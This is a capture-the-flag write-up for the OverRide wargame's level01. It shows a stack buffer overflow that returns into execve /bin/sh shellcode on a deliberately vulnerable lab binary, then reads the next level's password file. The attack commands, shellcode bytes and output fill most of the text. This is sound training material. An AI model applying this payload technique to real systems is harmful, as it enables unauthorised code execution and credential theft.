Level01 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

Level01 rights:
```Shell
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
```

Testing the binary shows that it asks for a username and a password, and seems to exit if not provided with the correct values.
Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
- it won't exit the program if the username is `dat_wil`
- no matter what password you enter, it will exit the program
- there is no system calls or easy access to a shell, so we must do a buffer overflow

The program uses `fgets()` twice, but we will exploit the second call as it uses a local buffer variable `s`.
First, let's find the address of the buffer using `ltrace`:
```Shell
level01@OverRide:~$ ltrace ./level01
[...]
fgets(admin
"admin\n", 100, 0xf7fcfac0) = 0xffffd6ec
[...]
```

Now, let's calculate the offset, using a pattern from a generator:
```Shell
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) 
```
Our offset is 80. Since our shellcode is 21 bytes long, the padding will have to be 59 bytes long.

So this will be our payload: username + "\n" (in order to get to the second user input) + shellcode + padding + address of our buffer written in little endian

Here it is, stored in a place where we can create new files:
```Shell
level01@OverRide:~$ python -c 'print("dat_will\n" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 59 + "\xff\xff\xd6\xec"[::-1])' > /tmp/payload01
```

And here is the final result (don't forget to use `-` to keep the shell interactive):
```Shell
level01@OverRide:~$ cat /tmp/payload01 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```